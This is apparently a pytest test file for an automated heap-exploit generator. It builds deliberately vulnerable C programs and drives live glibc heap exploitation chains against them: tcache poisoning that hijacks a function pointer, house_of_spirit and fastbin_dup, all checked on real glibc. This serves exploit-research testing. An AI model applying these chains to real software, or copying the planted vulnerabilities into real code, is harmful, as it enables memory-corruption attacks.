"""Phase 9 (frontier) — AAHEG heap-vuln -> primitive chaining, verified on real glibc."""
from __future__ import annotations

import os
import re
import select
import subprocess

import pytest
from lykos.analyze.dynamic import sandbox
from lykos.analyze.poc import heap
from lykos.analyze.poc.aaheg import Env, Goal, Vuln, plan_exploit

# playground: tcache alloc/free/UAF-write + a global function pointer `fp` and a `c`all of it.
_PLAY = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static void* chunks[64];
void win(void){ puts("AAHEG-PWNED"); fflush(stdout); _exit(42); }
void (*fp)(void) __attribute__((aligned(16))) = 0;
int main(void){
  setvbuf(stdout,NULL,_IONBF,0);
  printf("fp=%p win=%p\n",(void*)&fp,(void*)win);
  char line[128];
  while(fgets(line,sizeof line,stdin)){
    char op; unsigned idx; unsigned long a,b;
    if(sscanf(line," %c",&op)!=1) continue;
    if(op=='a'){ sscanf(line," a %lu %u",&a,&idx); chunks[idx]=malloc(a);
                 printf("alloc[%u]=%p\n",idx,chunks[idx]); }
    else if(op=='f'){ sscanf(line," f %u",&idx); free(chunks[idx]); }
    else if(op=='w'){ sscanf(line," w %u %lx",&idx,&b); *(unsigned long*)chunks[idx]=b; }
    else if(op=='c'){ fp(); }
    else if(op=='q'){ break; }
  }
  return 0;
}
"""


def test_plan_selects_tcache_poisoning_for_uaf():
    plan = plan_exploit(Vuln("uaf", 24),
                        Goal("control_flow", target=0x404080, value=0x4011a6),
                        Env(glibc=(2, 42)))
    assert plan["ok"] and plan["technique"] == "tcache_poisoning" and plan["auto"]
    assert plan["primitive"] == "control-flow hijack" and plan["safe_linking"]
    ops = [s["op"] for s in plan["steps"]]
    assert ops == ["alloc", "alloc", "free", "free", "write_fd", "alloc", "alloc",
                   "write", "trigger"]
    assert plan["mangle"] is heap.mangle
    assert "fastbin_dup" in [a["technique"] for a in plan["advisory_alternatives"]]


def test_plan_primitive_scales_with_goal():
    tgt = dict(target=0x404080, value=0x1234)
    assert plan_exploit(Vuln("uaf"), Goal("arbitrary_alloc", **tgt))["primitive"] \
        == "arbitrary allocation"
    assert plan_exploit(Vuln("uaf"), Goal("arbitrary_write", **tgt))["primitive"] \
        == "arbitrary write"


def test_plan_large_size_is_advisory_only():
    plan = plan_exploit(Vuln("uaf", 0x900), Goal("arbitrary_alloc"), Env())
    assert not plan["ok"]                              # outside tcache -> no auto technique
    assert "house_of_spirit" in [a["technique"] for a in plan["advisory_alternatives"]]


def test_overflow_offers_unlink_and_house_of_force():
    plan = plan_exploit(Vuln("heap_overflow", 0x40), Goal("arbitrary_write", target=0x1),
                        Env(glibc=(2, 27)))
    techs = [a["technique"] for a in plan.get("advisory_alternatives", [])]
    assert "unlink" in techs and "house_of_force" in techs


# ------------------------------------------------------------- live: full chain on real glibc
@pytest.fixture
def aaheg_bin(gcc, tmp_path_factory):
    if sandbox.host_arch() != "x86-64":
        pytest.skip("AAHEG chain test is x86-64 native only")
    d = tmp_path_factory.mktemp("aaheg")
    c = d / "a.c"; c.write_text(_PLAY)
    out = d / "a"
    if subprocess.run([gcc, "-O0", "-no-pie", str(c), "-o", str(out)],
                      capture_output=True).returncode != 0:
        pytest.skip("cannot build AAHEG playground")
    return out


def _drive(p, data):
    if data:
        p.stdin.write(data); p.stdin.flush()
    out = b""
    while select.select([p.stdout], [], [], 0.4)[0]:
        c = os.read(p.stdout.fileno(), 4096)
        if not c:
            break
        out += c
    return out.decode("latin-1", "ignore")


def test_aaheg_chain_hijacks_control_flow_on_real_glibc(aaheg_bin):
    """Generate the UAF->tcache-poison->overwrite-fp->call chain and drive it against real
    glibc; the function pointer is hijacked to win() (observed by its marker)."""
    p = subprocess.Popen([str(aaheg_bin)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    try:
        banner = _drive(p, b"")
        fp = int(re.search(r"fp=0x([0-9a-f]+)", banner).group(1), 16)
        win = int(re.search(r"win=0x([0-9a-f]+)", banner).group(1), 16)
        plan = plan_exploit(Vuln("uaf", 24),
                            Goal("control_flow", target=fp, value=win, trigger="call fp"),
                            Env(glibc=(2, 42)))
        assert plan["ok"]
        # map the abstract chain onto the playground's interface (analyst-in-the-loop step)
        a0 = int(re.search(r"alloc\[0\]=0x([0-9a-f]+)", _drive(p, b"a 24 0\n")).group(1), 16)
        forged = plan["mangle"](a0, fp)                # write_fd value from the plan
        _drive(p, b"a 24 1\nf 1\nf 0\n")               # alloc B; free B; free A (LIFO head=A)
        _drive(p, ("w 0 %x\n" % forged).encode())      # write_fd: forge A.fd -> fp
        out = _drive(p, b"a 24 2\na 24 3\n")           # alloc (->A); alloc OUT (-> fp)
        assert int(re.search(r"alloc\[3\]=0x([0-9a-f]+)", out).group(1), 16) == fp
        res = _drive(p, ("w 3 %x\nc\n" % win).encode())  # write OUT=win; trigger (call fp)
        assert "AAHEG-PWNED" in res                    # control-flow hijacked to win()
    finally:
        for s in (p.stdin, p.stdout):                  # win() _exit()s the process mid-chain
            try:
                s.close()
            except (BrokenPipeError, OSError):
                pass
        try:
            p.kill(); p.wait(timeout=3)
        except Exception:
            pass


def test_large_and_unsorted_bin_attacks_advised():
    # a large-bin-sized UAF -> large-bin & unsorted-bin attacks advised (both non-fastbin)
    plan = plan_exploit(Vuln("uaf", 0x420), Goal("arbitrary_write", target=0x404080),
                        Env(glibc=(2, 42)))
    techs = [a["technique"] for a in plan.get("advisory_alternatives", [])]
    assert "large_bin_attack" in techs and "unsorted_bin_attack" in techs
    # a fastbin-sized UAF should NOT advise the large-bin attack
    small = plan_exploit(Vuln("uaf", 24), Goal("arbitrary_write", target=0x404080))
    assert "large_bin_attack" not in [a["technique"] for a in small["advisory_alternatives"]]


def test_advisory_techniques_are_generated_chains():
    # advisory alternatives now carry a full generated op-chain + preconditions, not an outline
    plan = plan_exploit(Vuln("uaf", 0x50), Goal("arbitrary_alloc"), Env(glibc=(2, 42)))
    adv = {a["technique"]: a for a in plan["advisory_alternatives"]}
    for tech in ("fastbin_dup", "house_of_spirit"):
        a = adv[tech]
        assert a["generated"] and not a["auto"]
        assert a["confirmed_on_real_glibc"]           # mechanics live-verified below
        assert a["steps"] and a["preconditions"]
        assert all("op" in s for s in a["steps"])
    # a fastbin-size fastbin_dup emits the tcache-fill groom + the double-free cycle
    ops = [s["op"] for s in adv["fastbin_dup"]["steps"]]
    assert ops.count("free") == 3 and ops[0] == "groom" and "write_fd" in ops


def test_unlink_and_large_bin_chains_generated_when_applicable():
    ov = plan_exploit(Vuln("heap_overflow", 0x40), Goal("arbitrary_write", target=0x1),
                      Env(glibc=(2, 27)))
    unlink = next(a for a in ov["advisory_alternatives"] if a["technique"] == "unlink")
    assert [s["op"] for s in unlink["steps"]][:2] == ["note", "forge"]
    lb = plan_exploit(Vuln("uaf", 0x420), Goal("arbitrary_write", target=0x404080), Env())
    large = next(a for a in lb["advisory_alternatives"] if a["technique"] == "large_bin_attack")
    assert any(s["op"] == "write_nextsize" for s in large["steps"])


# ---------------------------------------------------- live: generated advisory mechanics
_HOS = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static unsigned long g[32] __attribute__((aligned(16)));
int main(void){
  setvbuf(stdout,NULL,_IONBF,0);
  printf("g=%p\n",(void*)&g[2]);            /* forged user pointer */
  char line[128];
  while(fgets(line,sizeof line,stdin)){
    char op; unsigned i; unsigned long a,b;
    if(sscanf(line," %c",&op)!=1) continue;
    if(op=='s'){ sscanf(line," s %u %lx",&i,&b); g[i]=b; }   /* forge a header word */
    else if(op=='f'){ free((void*)&g[2]); }                  /* free the fake userptr */
    else if(op=='m'){ sscanf(line," m %lu",&a); printf("m=%p\n",malloc(a)); }
    else if(op=='q'){ break; }
  }
  return 0;
}
"""

_FDUP = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
static void* c[64];
int main(void){
  setvbuf(stdout,NULL,_IONBF,0);
  char line[128];
  while(fgets(line,sizeof line,stdin)){
    char op; unsigned i; unsigned long a;
    if(sscanf(line," %c",&op)!=1) continue;
    if(op=='a'){ sscanf(line," a %lu %u",&a,&i); c[i]=malloc(a); printf("a[%u]=%p\n",i,c[i]); }
    else if(op=='f'){ sscanf(line," f %u",&i); free(c[i]); }
    else if(op=='q'){ break; }
  }
  return 0;
}
"""


def _build(gcc, tmp, src, name):
    if sandbox.host_arch() != "x86-64":
        pytest.skip("live heap technique test is x86-64 native only")
    c = tmp / (name + ".c"); c.write_text(src)
    out = tmp / name
    if subprocess.run([gcc, "-O0", "-no-pie", str(c), "-o", str(out)],
                      capture_output=True).returncode != 0:
        pytest.skip("cannot build " + name)
    return out


def test_house_of_spirit_allocates_over_controlled_memory_on_real_glibc(gcc, tmp_path):
    """Drive the generated house_of_spirit chain: forge a chunk header over a global buffer,
    free it, and malloc returns the controlled address -- confirmed on the host's glibc."""
    exe = _build(gcc, tmp_path, _HOS, "hos")
    # the plan tells us the chunk size to forge and that it targets controlled memory
    plan = plan_exploit(Vuln("uaf", 0x50), Goal("arbitrary_alloc"), Env(glibc=(2, 42)))
    hos = next(a for a in plan["advisory_alternatives"] if a["technique"] == "house_of_spirit")
    assert hos["confirmed_on_real_glibc"]
    cs = heap.request2size(0x50)                     # 0x60
    p = subprocess.Popen([str(exe)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    try:
        userptr = int(re.search(r"g=0x([0-9a-f]+)", _drive(p, b"")).group(1), 16)
        # forge: size field (chunk = userptr-0x10) and a sane next-chunk size, then free+malloc
        _drive(p, ("s 1 %x\n" % (cs | 1)).encode())          # g[1] = size | PREV_INUSE
        _drive(p, ("s %d 21\n" % (cs // 8 + 1)).encode())    # next chunk size = 0x21
        _drive(p, b"f\n")                                     # free(&fake) -> fastbin
        got = int(re.search(r"m=0x([0-9a-f]+)", _drive(p, b"m 80\n")).group(1), 16)
        assert got == userptr                                # malloc returned controlled memory
    finally:
        for s in (p.stdin, p.stdout):
            try:
                s.close()
            except (BrokenPipeError, OSError):
                pass
        p.kill(); p.wait(timeout=3)


def test_fastbin_dup_returns_duplicate_on_real_glibc(gcc, tmp_path):
    """Drive the generated fastbin_dup chain's core: fill the tcache, double-free a fastbin
    chunk, and observe the same address handed out twice -- confirmed on the host's glibc."""
    exe = _build(gcc, tmp_path, _FDUP, "fdup")
    plan = plan_exploit(Vuln("double_free", 0x50), Goal("arbitrary_alloc"), Env(glibc=(2, 42)))
    fd = next(a for a in plan["advisory_alternatives"] if a["technique"] == "fastbin_dup")
    assert fd["confirmed_on_real_glibc"]
    p = subprocess.Popen([str(exe)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    try:
        script = b"".join(b"a 80 %d\n" % i for i in range(9))         # 9 fastbin-size chunks
        out = _drive(p, script)
        a7 = int(re.search(r"a\[7\]=0x([0-9a-f]+)", out).group(1), 16)
        _drive(p, b"".join(b"f %d\n" % i for i in range(7)))          # fill tcache (7)
        _drive(p, b"f 7\nf 8\nf 7\n")                                 # double-free 7 in fastbin
        reclaim = _drive(p, b"".join(b"a 80 %d\n" % i for i in range(20, 30)))
        addrs = [int(x, 16) for x in re.findall(r"a\[2[0-9]\]=0x([0-9a-f]+)", reclaim)]
        assert addrs.count(a7) == 2                                  # the dup: a[7] handed twice
    finally:
        for s in (p.stdin, p.stdout):
            try:
                s.close()
            except (BrokenPipeError, OSError):
                pass
        p.kill(); p.wait(timeout=3)
